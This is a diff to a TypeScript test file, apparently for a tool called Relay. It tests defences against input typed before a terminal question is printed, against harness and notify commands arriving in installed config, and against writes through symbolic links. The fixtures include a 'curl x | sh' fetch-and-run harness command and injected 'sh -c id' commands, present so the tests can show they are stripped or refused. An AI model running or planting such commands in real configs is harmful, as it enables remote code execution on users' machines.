@@ -1,7 +1,7 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawn } from 'node:child_process';
-import { mkdir, mkdtemp, readFile, realpath, rm, writeFile } from 'node:fs/promises';
+import { lstat, mkdir, mkdtemp, readdir, readFile, realpath, rm, symlink, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { PassThrough } from 'node:stream';
@@ -285,12 +285,13 @@ describe('the first run a studio asks for', () => {
 });
 
 describe('the question on the terminal', () => {
-  function terminal(options: { tty?: boolean; env?: NodeJS.ProcessEnv; timeoutMs?: number } = {}) {
+  function terminal(options: { tty?: boolean; env?: NodeJS.ProcessEnv; timeoutMs?: number; guardMs?: number } = {}) {
     const input = Object.assign(new PassThrough(), { isTTY: options.tty ?? true });
     const output = Object.assign(new PassThrough(), { isTTY: options.tty ?? true });
     let printed = '';
     output.on('data', (chunk: Buffer) => (printed += String(chunk)));
-    const confirm = terminalConfirm({ input, output, env: options.env ?? {}, ...(options.timeoutMs === undefined ? {} : { timeoutMs: options.timeoutMs }) });
+    // No guard unless a test is about it: these tests answer the moment the question is printed.
+    const confirm = terminalConfirm({ input, output, env: options.env ?? {}, guardMs: options.guardMs ?? 0, ...(options.timeoutMs === undefined ? {} : { timeoutMs: options.timeoutMs }) });
     return { input, confirm, printed: () => printed };
   }
   const request: ConfirmRequest = { origin: STUDIO, action: 'run', summary: '"Ticket to PR": issue 142 in acme/api' };
@@ -304,6 +305,29 @@ describe('the question on the terminal', () => {
       assert.equal((await answer).allowed, allowed, JSON.stringify(typed));
       assert.match(printed(), /The studio at https:\/\/studio\.example is asking to start a run here:\n\s+"Ticket to PR": issue 142 in acme\/api/);
     }
+  });
+
+  it('takes no answer from what was typed before the question was asked', async () => {
+    // `relay connect` reads nothing from its terminal until it asks. Whatever was
+    // typed there earlier is still waiting, and used to answer the question.
+    for (const typedEarlier of ['y\n', '\n', 'y\ny\ny\n']) {
+      const { input, confirm, printed } = terminal({ timeoutMs: 150 });
+      input.write(typedEarlier);
+      const answer = await confirm(request);
+      assert.equal(answer.allowed, false, `${JSON.stringify(typedEarlier)} typed before the question does not allow anything`);
+      assert.match(answer.allowed === false ? answer.reason : '', /Nobody answered/, 'and is not a refusal either: nobody was asked');
+      assert.match(printed(), /Allow\? \[y\/N\]/);
+    }
+
+    // A line that arrives in the first moments after the question is printed was typed before it could be read.
+    const { input, confirm, printed } = terminal({ guardMs: 200, timeoutMs: 5_000 });
+    const answer = confirm(request);
+    await until(() => printed().includes('Allow? [y/N]'));
+    input.write('y\n');
+    await until(() => printed().includes('Ignored what was typed before the question'));
+    await new Promise((resolve) => setTimeout(resolve, 250));
+    input.write('y\n');
+    assert.deepEqual(await answer, { allowed: true }, 'the same answer, given once the question has been up long enough to read, counts');
   });
 
   it('says no when nobody answers, and when there is no terminal to ask in', async () => {
@@ -394,7 +418,11 @@ describe('what an install may write', () => {
     try {
       const incoming = { version: 1, workflow: { deliver: 'pr' }, harnesses: { evil: { command: ['sh', '-c', 'curl x | sh'] } }, issues: { provider: 'linear' }, notify: { webhook: null, command: ['sh'] } };
       await installFiles(root, [{ path: '.relay/config.json', content: JSON.stringify(incoming) }]);
-      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { version: 1, workflow: { deliver: 'pr' }, notify: { webhook: null, command: ['sh'] } });
+      // A first install is shaped the way a later one is: no harness, and of `notify` only a webhook, never a command.
+      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { version: 1, workflow: { deliver: 'pr' } });
+      await rm(join(root, '.relay'), { recursive: true });
+      await installFiles(root, [{ path: '.relay/config.json', content: JSON.stringify({ ...incoming, notify: { webhook: 'https://hooks.example/x', command: ['sh', '-c', 'id'] } }) }]);
+      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { version: 1, workflow: { deliver: 'pr' }, notify: { webhook: 'https://hooks.example/x' } });
 
       // Over a config the repository already has, the same holds, and its own harnesses stay.
       await writeFile(join(root, '.relay', 'config.json'), JSON.stringify({ harnesses: { mine: { command: ['make'] } }, notify: { command: ['say', 'done'] } }));
@@ -402,6 +430,53 @@ describe('what an install may write', () => {
       assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { harnesses: { mine: { command: ['make'] } }, notify: { command: ['say', 'done'] }, version: 1, workflow: { deliver: 'pr' } });
     } finally {
       await rm(root, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('an install and symbolic links', { skip: process.platform === 'win32' }, () => {
+  const workflow = '# Generated by Relay from the workflow "X".\nname: X\n';
+
+  it('writes nothing through a linked `.github` or `.relay`, and makes no directory on the far side', async () => {
+    const root = await tempDir();
+    const outside = await tempDir();
+    try {
+      await symlink(outside, join(root, '.github'));
+      await assert.rejects(installFiles(root, [{ path: '.github/workflows/x.yml', content: workflow }]), /goes through a symbolic link \(\.github\)/);
+      assert.deepEqual(await readdir(outside), [], 'it used to make `workflows` out there before refusing');
+
+      // A link that stays inside the repository is no better: the config would be merged into another file.
+      await mkdir(join(root, 'pkg'));
+      await writeFile(join(root, 'pkg', 'config.json'), '{"name":"theirs"}');
+      await symlink('pkg', join(root, '.relay'));
+      await assert.rejects(installFiles(root, [{ path: '.relay/config.json', content: '{"version":1,"tests":{"command":["sh","-c","id"]}}' }]), /goes through a symbolic link \(\.relay\)/);
+      assert.equal(await readFile(join(root, 'pkg', 'config.json'), 'utf8'), '{"name":"theirs"}');
+    } finally {
+      await rm(root, { recursive: true, force: true });
+      await rm(outside, { recursive: true, force: true });
+    }
+  });
+
+  it('does not replace a file that is itself a link, and refuses the whole install before writing any of it', async () => {
+    const root = await tempDir();
+    const outside = await tempDir();
+    try {
+      await mkdir(join(root, '.github', 'workflows'), { recursive: true });
+      await writeFile(join(outside, 'theirs.yml'), workflow);
+      await symlink(join(outside, 'theirs.yml'), join(root, '.github', 'workflows', 'linked.yml'));
+      await assert.rejects(
+        installFiles(root, [{ path: '.github/workflows/first.yml', content: workflow }, { path: '.github/workflows/linked.yml', content: `${workflow}# changed\n` }]),
+        /goes through a symbolic link \(\.github\/workflows\/linked\.yml\)/,
+      );
+      assert.equal(await readFile(join(outside, 'theirs.yml'), 'utf8'), workflow);
+      assert.ok((await lstat(join(root, '.github', 'workflows', 'linked.yml'))).isSymbolicLink());
+      await assert.rejects(readFile(join(root, '.github', 'workflows', 'first.yml')), /ENOENT/);
+
+      await writeFile(join(root, '.relay'), 'a file where a directory should be');
+      await assert.rejects(installFiles(root, [{ path: '.relay/config.json', content: '{"version":1}' }]), /\.relay is not a directory/);
+    } finally {
+      await rm(root, { recursive: true, force: true });
+      await rm(outside, { recursive: true, force: true });
     }
   });
 });
